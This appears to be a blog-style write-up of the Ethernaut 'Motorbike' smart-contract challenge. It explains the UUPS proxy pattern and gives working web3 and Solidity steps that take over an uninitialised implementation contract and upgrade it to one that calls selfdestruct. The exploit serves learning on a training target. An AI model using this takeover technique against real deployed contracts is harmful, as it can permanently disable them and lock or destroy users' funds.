# Ethernaut 25: Motorbike

Learn about the UUPS pattern. Initalization of a implementation combined with a delegatecall on the implementation will give a security breach.

## The Task Intro

Ethernaut's motorbike has a brand new upgradeable engine design.

Would you be able to selfdestruct its engine and make the motorbike unusable ?

Things that might help:

EIP-1967
UUPS upgradeable pattern
Initializable contract

## The Task Code

```apache
// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import "openzeppelin-contracts-06/utils/Address.sol";
import "openzeppelin-contracts-06/proxy/Initializable.sol";

contract Motorbike {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    struct AddressSlot {
        address value;
    }

    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
    constructor(address _logic) public {
        require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
        (bool success,) = _logic.delegatecall(
            abi.encodeWithSignature("initialize()")
        );
        require(success, "Call failed");
    }

    // Delegates the current call to `implementation`.
    function _delegate(address implementation) internal virtual {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    // Fallback function that delegates calls to the address returned by `_implementation()`.
    // Will run if no other function in the contract matches the call data
    fallback () external payable virtual {
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
    }

    // Returns an `AddressSlot` with member `value` located at `slot`.
    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r_slot := slot
        }
    }
}

contract Engine is Initializable {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader;
    uint256 public horsePower;

    struct AddressSlot {
        address value;
    }

    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }

    // Upgrade the implementation of the proxy to `newImplementation`
    // subsequently execute the function call
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }

    // Restrict to upgrader role
    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }

    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
    function _upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) internal {
        // Initial upgrade and setup call
        _setImplementation(newImplementation);
        if (data.length > 0) {
            (bool success,) = newImplementation.delegatecall(data);
            require(success, "Call failed");
        }
    }

    // Stores a new address in the EIP1967 implementation slot.
    function _setImplementation(address newImplementation) private {
        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");

        AddressSlot storage r;
        assembly {
            r_slot := _IMPLEMENTATION_SLOT
        }
        r.value = newImplementation;
    }
}
```

## The Solution

In this ethernaut challenge I see the first time the UUPS Pattern for upgradable contracts, which means the code to upgrade the implementation resides on the implementation. The storage is on the proxy, which holds in the UUPS pattern just the storage slot. The upgrade mechanism is in the implementation. It will be called through the proxy pattern.

The ethernaut Motorbike challange gives uns two contracts, Motorbike (Proxy) and Engine (Implementation). My task is to selfdestruct the engine.

Looking at the proxy it seems like I can do nothing through it, on the implementation there is no selfdestruct upcode in a function. Therefore I want to change the implementation, but this seems to be impossible through the proxy, because I am not the upgrader.

That lead my focus to the implementation contract, can I initalize the contract on the implementation level and be the upgrader myself? Yes - thats possible, no protection! This protection only resides on the Proxy level, there is the storage. Strange that there is no protection for this. Ok.

After I am upgrader of the contract, I want to upgrade the contract to a contract I created that only contains a function kill with a selfdestruct statement. Thats it:

````apache
// get the implementation address
await web3.eth.getStorageAt("MoterbikeAddress","0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")
```
````

With the implementation address in my hand I call initalize:

```àpache
// initalize on the implementation
let initData = web3.eth.abi.encodeFunctionSignature("initialize()")
await web3.eth.sendTransaction({from: player, to: "implementationAddress", data: initData })
```

Now I am the upgrader, with this I want to call the upgradeToAndCall function, that allows me to change the implementation and make a delegate call. For this I need first a contract with a selfdestruct Upcode in a function, therefore I deploy a contract:

```àpache
contract AttackMotorbike {
    function kill() public {
        selfdestruct(payable(msg.sender));
    }
}
```

This is the new implementation I want to upgrade to and call the kill function. To do this I create two function selectors - upgradeToAndCall and kill. With the web3 library the only way to call a function with parameters is sentTransfer, for this I need to encode the full function with web3.eth.encodeFunctionCall. This function takes the function signature as json and followed with the parameters in an array. Unfortunately no method is there for adding the function selector as string.

```apache
// encode the kill function
let kill = web3.eth.abi.encodeEventSignature("kill()")

// create function signature
let upgradeSig = {
    name: 'upgradeToAndCall',
    type: 'function',
    inputs: [
        {
            type: 'address',
            name: 'newImplementation'
        },
        {
            type: 'bytes',
            name: 'data'
        }
    ]
}

// prepare the calldata with web3.eth.encodeFunctionCall
let data = web3.eth.abi.encodeFunctionCall(upgradeSig, ["AttackMotorbikeAddress", kill])

await web3.eth.sendTransaction({from: player, to: "implementationAddress", data: data })

```

Done 🎉️. The hardest part of this exercise was to understand the vulnerability of uninitalized implementation contracts. The proxy needs to initalize the implementation in the constructor. But this is not enough, because storage is hold on the proxy level. In this exercise I was able to initalize the implementation contract with its own storage, allowing me to change the implementation in its own storage and finally use selfdestruct :-), making the proxy contract useless.
